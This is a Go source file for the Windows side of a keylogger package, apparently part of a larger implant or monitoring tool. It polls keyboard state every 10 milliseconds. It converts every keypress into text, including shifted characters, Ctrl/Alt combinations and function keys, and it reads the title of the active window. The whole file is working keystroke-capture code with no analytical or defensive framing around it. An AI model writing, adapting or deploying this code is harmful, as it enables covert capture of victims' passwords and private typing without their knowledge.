//go:build windows && !nokeylogger
// +build windows,!nokeylogger

package keylogger

import (
	"fmt"
	"log"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

var (
	user32                  = syscall.NewLazyDLL("user32.dll")
	procGetAsyncKeyState    = user32.NewProc("GetAsyncKeyState")
	procGetKeyState         = user32.NewProc("GetKeyState")
	procGetKeyboardState    = user32.NewProc("GetKeyboardState")
	procToUnicode           = user32.NewProc("ToUnicode")
	procMapVirtualKey       = user32.NewProc("MapVirtualKeyW")
	procGetForegroundWindow = user32.NewProc("GetForegroundWindow")
	procGetWindowTextW      = user32.NewProc("GetWindowTextW")
)

const (
	VK_SHIFT   = 0x10
	VK_CONTROL = 0x11
	VK_MENU    = 0x12 // ALT
	VK_CAPITAL = 0x14 // CAPS LOCK
)

var keyNames = map[int]string{
	0x08:       "[BACKSPACE]",
	0x09:       "[TAB]",
	0x0D:       "[ENTER]",
	0x1B:       "[ESC]",
	0x20:       " ",
	0x21:       "[PAGE UP]",
	0x22:       "[PAGE DOWN]",
	0x23:       "[END]",
	0x24:       "[HOME]",
	0x25:       "[LEFT]",
	0x26:       "[UP]",
	0x27:       "[RIGHT]",
	0x28:       "[DOWN]",
	0x2C:       "[PRINT SCREEN]",
	0x2D:       "[INSERT]",
	0x2E:       "[DELETE]",
	0x5B:       "[LEFT WIN]",
	0x5C:       "[RIGHT WIN]",
	0x5D:       "[MENU]",
	VK_SHIFT:   "[SHIFT]",
	VK_CONTROL: "[CTRL]",
	VK_MENU:    "[ALT]",
}

func (k *Keylogger) captureKeystrokes() error {
	keyState := make(map[int]bool)

	for {
		select {
		case <-k.stopCh:
			return nil
		default:
			time.Sleep(10 * time.Millisecond)

			// Check all printable keys and special keys
			for vk := 8; vk <= 190; vk++ {
				ret, _, _ := procGetAsyncKeyState.Call(uintptr(vk))
				keyDown := (ret & 0x8000) != 0

				if keyDown && !keyState[vk] {
					keyState[vk] = true
					key := getKeyString(vk)
					if key != "" {
						k.logKey(key)
					}
				} else if !keyDown {
					keyState[vk] = false
				}
			}
		}
	}
}

func getKeyString(vk int) string {
	if name, ok := keyNames[vk]; ok {
		if vk == VK_SHIFT || vk == VK_CONTROL || vk == VK_MENU {
			return ""
		}
		return name
	}

	var kbState [256]byte
	ret, _, err := procGetKeyboardState.Call(uintptr(unsafe.Pointer(&kbState[0])))
	if ret == 0 {
		log.Printf("[keylogger] GetKeyboardState failed: %v", err)
		return ""
	}

	shiftDown := (getAsyncKeyState(VK_SHIFT) & 0x8000) != 0
	ctrlDown := (getAsyncKeyState(VK_CONTROL) & 0x8000) != 0
	altDown := (getAsyncKeyState(VK_MENU) & 0x8000) != 0
	if shiftDown {
		kbState[VK_SHIFT] |= 0x80
	} else {
		kbState[VK_SHIFT] &^= 0x80
	}
	if ctrlDown {
		kbState[VK_CONTROL] |= 0x80
	} else {
		kbState[VK_CONTROL] &^= 0x80
	}
	if altDown {
		kbState[VK_MENU] |= 0x80
	} else {
		kbState[VK_MENU] &^= 0x80
	}

	capsOn := (getKeyState(VK_CAPITAL) & 0x0001) != 0
	if capsOn {
		kbState[VK_CAPITAL] |= 0x01
	} else {
		kbState[VK_CAPITAL] &^= 0x01
	}

	if ctrlDown || altDown {
		base := keyNameForCombo(vk)
		if base != "" {
			return formatCombo(ctrlDown, altDown, shiftDown, base)
		}
	}

	var buffer [5]uint16
	sc, _, _ := procMapVirtualKey.Call(uintptr(vk), 0)
	n, _, _ := procToUnicode.Call(
		uintptr(vk),
		sc,
		uintptr(unsafe.Pointer(&kbState[0])),
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(len(buffer)),
		0,
	)

	if n > 0 {
		return syscall.UTF16ToString(buffer[:n])
	}

	if s := oemKeyFallback(vk, shiftDown); s != "" {
		return s
	}

	if vk >= 0x70 && vk <= 0x87 {
		return fmt.Sprintf("[F%d]", vk-0x6F)
	}

	if vk >= 0x60 && vk <= 0x69 {
		return fmt.Sprintf("%d", vk-0x60)
	}

	return ""
}

func oemKeyFallback(vk int, shiftDown bool) string {
	switch vk {
	case 0xBA: // VK_OEM_1 ;:
		if shiftDown {
			return ":"
		}
		return ";"
	case 0xBB: // VK_OEM_PLUS =+
		if shiftDown {
			return "+"
		}
		return "="
	case 0xBC: // VK_OEM_COMMA ,<
		if shiftDown {
			return "<"
		}
		return ","
	case 0xBD: // VK_OEM_MINUS -_
		if shiftDown {
			return "_"
		}
		return "-"
	case 0xBE: // VK_OEM_PERIOD .>
		if shiftDown {
			return ">"
		}
		return "."
	case 0xBF: // VK_OEM_2 /?
		if shiftDown {
			return "?"
		}
		return "/"
	case 0xC0: // VK_OEM_3 `~
		if shiftDown {
			return "~"
		}
		return "`"
	case 0xDB: // VK_OEM_4 [{
		if shiftDown {
			return "{"
		}
		return "["
	case 0xDC: // VK_OEM_5 \|
		if shiftDown {
			return "|"
		}
		return "\\"
	case 0xDD: // VK_OEM_6 ]}
		if shiftDown {
			return "}"
		}
		return "]"
	case 0xDE: // VK_OEM_7 '\"
		if shiftDown {
			return "\""
		}
		return "'"
	}
	return ""
}

func getAsyncKeyState(vk int) uint16 {
	ret, _, _ := procGetAsyncKeyState.Call(uintptr(vk))
	return uint16(ret)
}

func getKeyState(vk int) uint16 {
	ret, _, _ := procGetKeyState.Call(uintptr(vk))
	return uint16(ret)
}

func keyNameForCombo(vk int) string {
	// Letters
	if vk >= 0x41 && vk <= 0x5A {
		return string(rune('A' + (vk - 0x41)))
	}
	// Digits 0-9
	if vk >= 0x30 && vk <= 0x39 {
		return string(rune('0' + (vk - 0x30)))
	}
	// Function keys
	if vk >= 0x70 && vk <= 0x87 {
		return fmt.Sprintf("F%d", vk-0x6F)
	}
	// Numpad digits
	if vk >= 0x60 && vk <= 0x69 {
		return fmt.Sprintf("NUM%d", vk-0x60)
	}
	return ""
}

func formatCombo(ctrlDown, altDown, shiftDown bool, key string) string {
	parts := make([]string, 0, 4)
	if ctrlDown {
		parts = append(parts, "CTRL")
	}
	if altDown {
		parts = append(parts, "ALT")
	}
	if shiftDown {
		parts = append(parts, "SHIFT")
	}
	parts = append(parts, key)
	return "[" + strings.Join(parts, "+") + "]"
}

func getWindowTitle() string {
	hwnd, _, _ := procGetForegroundWindow.Call()
	if hwnd == 0 {
		return ""
	}

	var buf [256]uint16
	ret, _, _ := procGetWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)))
	if ret == 0 {
		return ""
	}

	return syscall.UTF16ToString(buf[:])
}
